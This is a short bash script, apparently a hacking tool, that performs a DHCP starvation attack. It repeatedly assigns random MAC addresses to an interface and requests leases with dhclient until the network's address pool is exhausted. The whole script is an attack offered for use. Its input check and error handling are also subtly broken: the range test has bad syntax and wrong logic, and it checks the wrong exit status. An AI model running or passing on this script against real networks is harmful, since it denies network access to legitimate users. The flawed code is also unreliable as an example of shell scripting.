#!/bin/bash

usage(){
	echo "[+] Usage: ./dhcp-starve.sh <interface>"
}

if [ $# -ne 1 ]
then
	usage
    exit 1
fi

interface=$1
ip=$(ifconfig $1 | grep netmask | grep -Po '(?<=inet )[\d.]+')
netmask=$(ifconfig $1 | grep netmask | grep -Po '(?<=netmask )[\d.]+')
mac=$(ifconfig $1 | grep ether | grep -Po '(?<=ether )[\w.]+')
#ipthirdoctet=$(ifconfig $1 |grep netmask|grep -Po '(?<=inet )[\d.]+'|cut -d "." -f 3)

if [ $? -ne 0 ]
then
    echo "[*] Invalid interface"
    exit $?
fi

echo "[+] Current ip: $ip"
echo "[+] Subnet: $netmask"
echo "[+] Mac Address: $mac"
read -p "> Specify start host id: " start
read -p "> Specify stop host id: " stop

if [ ( $start -lt 1 ) -a ( $start -gt 254 ) -a ( $stop -lt 1 ) -a ( $start -gt 254 ) -a ( $start -gt $stop ) ]
then
	echo "[+] Please ensure:"
	echo "\t- Start and Stop values are not less than 1 and not greater than 254"
	echo "\t- Start value is greater than Stop value"
	exit 1
fi

for (( i=$start; i <= $stop; i++ ));
do
    printf "."
    ifconfig $1 down
    randmac=$(echo $[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
    #ifconfig $1 192.168.${ipthirdoctet}.${i} netmask $onetmask
    ifconfig $1 hw ether $randmac
    ifconfig $1 up
    dhclient $1
done

ifconfig $1 down
ifconfig $1 hw ether $mac
ifconfig $1 $ip netmask $netmask
ifconfig $1 up
echo "====================Done===================="
ifconfig $1
